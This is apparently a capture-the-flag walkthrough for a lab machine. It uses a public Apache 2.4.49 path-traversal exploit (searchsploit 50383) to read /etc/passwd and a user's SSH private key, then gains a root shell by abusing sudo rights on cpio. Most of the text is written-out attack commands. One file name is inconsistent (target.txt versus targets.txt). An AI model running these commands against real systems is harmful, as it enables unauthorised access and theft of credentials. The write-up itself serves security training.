There are two ports open, 22 and 80

According to the Nmap output, Apache is running with version 2.4.49, which after research we see there's a known hack for it
```
searchsploit -m 50383
```
We need to create a `target.txt` file with the following contents:
`10.0.160.144`

echo '10.0.160.144' > target.txt

And run the hacking script
```
./50383.sh targets.txt /etc/passwd
```
This lets us know there is a ETSCTF user. It turns out this user has a SSH private key
```
./50383.sh target.txt /home/ETSCTF/.ssh/id_rsa
```
Then create our own version of the id_rsa key

We have sudo permissions with the cpio binary
```
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```
